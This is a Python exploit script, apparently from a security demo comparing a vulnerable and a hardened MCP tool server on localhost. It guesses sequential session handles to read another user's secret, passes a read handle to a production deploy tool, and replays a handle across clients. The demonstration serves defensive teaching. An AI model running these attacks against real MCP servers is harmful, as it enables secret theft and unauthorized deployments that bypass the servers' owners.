#!/usr/bin/env python3
"""
attack.py -- drives 'The Confused Handle' exploit against a stateless MCP server.

A real MCP client (SDK 2.3.0, protocol pinned to 2026-07-28). Same script runs
against every target:

    .venv/bin/python attacks/attack.py         # :8181 vulnerable (exploit SUCCEEDS)
    .venv/bin/python attacks/attack.py 8282    # :8282 hardened   (exploit FAILS)
    .venv/bin/python attacks/attack.py http://127.0.0.1:3000/mcp   # any URL, e.g. a gateway

Narrative (three failure modes, one forged string):
  1. Broken state assumption -> attacker guesses Bob's handle, reads his secret
  2. Capability confusion     -> a read handle is accepted by the deploy tool
  3. Cross-client             -> a handle minted for Alice's IDE is replayed
                                 by the attacker's web agent
"""
import asyncio
import json
import sys

import httpx2
from mcp import Client
from mcp.client.streamable_http import streamable_http_client
from mcp.shared._httpx_utils import create_mcp_http_client

arg = sys.argv[1] if len(sys.argv) > 1 else "8181"
URL = arg if arg.startswith("http") else f"http://127.0.0.1:{arg}/mcp"


async def call(tool: str, args: dict, client: str = "attacker-web-agent") -> dict:
    # Stateless: every call is a fresh connection. The client identity rides in
    # a header -- which is exactly why a header alone is weak (see README).
    http: httpx2.AsyncClient = create_mcp_http_client(headers={"Mcp-Client": client})
    async with http, Client(streamable_http_client(URL, http_client=http), mode="2026-07-28") as c:
        res = await c.call_tool(tool, args)
    if res.structured_content is not None:
        return res.structured_content
    text = res.content[0].text if res.content else "{}"
    try:
        return json.loads(text)
    except json.JSONDecodeError:
        return {"error": text}


def line():
    print("-" * 68)


async def main():
    print(f"\n=== Attacking stateless MCP server at {URL} ===\n")

    # --- Step 0: attacker legitimately logs in as themselves (alice) --------
    print("[0] Attacker logs in as 'alice' via their own web agent.")
    mine = await call("open_session", {"user": "alice"})
    print("    got handle:", mine.get("handle"))
    line()

    # --- Attack 1: Broken state assumption / IDOR ---------------------------
    print("[1] BROKEN STATE ASSUMPTION -- guess Bob's handle, read his secret.")
    stolen = None
    for g in ["handle-2042", "handle-2041", "handle-2043"]:   # sequential guessing
        res = await call("read_secret", {"handle": g})
        if "secret" in res:
            stolen = res["secret"]
            print(f"    guess {g}  -> LEAKED: {stolen}")
            break
        print(f"    guess {g}  -> {res.get('error')}")
    if not stolen:
        print("    could not read anyone else's secret. IDOR blocked.")
    line()

    # --- Attack 2: Capability confusion -------------------------------------
    print("[2] CAPABILITY CONFUSION -- feed a READ handle to the DEPLOY tool.")
    res = await call("deploy", {"handle": mine.get("handle", ""), "target": "payments-prod"})
    if res.get("status", "").startswith("LIVE"):
        print(f"    deploy accepted a read handle -> {res}")
    else:
        print(f"    deploy rejected the read handle -> {res.get('error')}")
    line()

    # --- Attack 3: Cross-client replay --------------------------------------
    print("[3] CROSS-CLIENT REPLAY -- handle minted for the IDE, replayed by web agent.")
    ide = await call("open_session", {"user": "alice"}, client="alice-trusted-ide")
    print("    handle minted for client 'alice-trusted-ide'")
    res = await call("read_secret", {"handle": ide.get("handle", "")})
    if "secret" in res:
        print(f"    replay from web agent WORKED -> {res['secret']}")
    else:
        print(f"    replay rejected -> {res.get('error')}")
    line()

    print("\n=== done ===\n")


if __name__ == "__main__":
    asyncio.run(main())
